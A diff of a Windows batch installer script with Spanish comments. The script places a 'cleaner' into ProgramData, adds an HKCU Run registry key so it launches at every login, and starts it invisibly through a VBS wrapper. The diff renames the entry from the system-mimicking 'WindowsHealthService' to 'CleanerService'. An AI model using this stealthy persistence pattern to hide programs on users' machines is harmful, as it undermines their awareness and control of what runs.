@@ -10,7 +10,7 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-set "targetDir=C:\ProgramData\WindowsHealthService"
+set "targetDir=C:\ProgramData\Cleaner"
 set "cleanerName=system_cleanup.bat"
 set "vbsName=start_service.vbs"
 
@@ -50,7 +50,7 @@ echo Set WshShell = Nothing >> "%targetDir%\%vbsName%"
 
 :: 4. Persistencia en el Registro (Carga en cada inicio)
 :: Se registra en HKCU para que no requiera permisos de administrador para activarse
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthService" /t REG_SZ /d "wscript.exe \"%targetDir%\%vbsName%\"" /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "CleanerService" /t REG_SZ /d "wscript.exe \"%targetDir%\%vbsName%\"" /f >nul 2>&1
 
 :: 5. Ejecutar ahora mismo de forma invisible
 start wscript.exe "%targetDir%\%vbsName%"
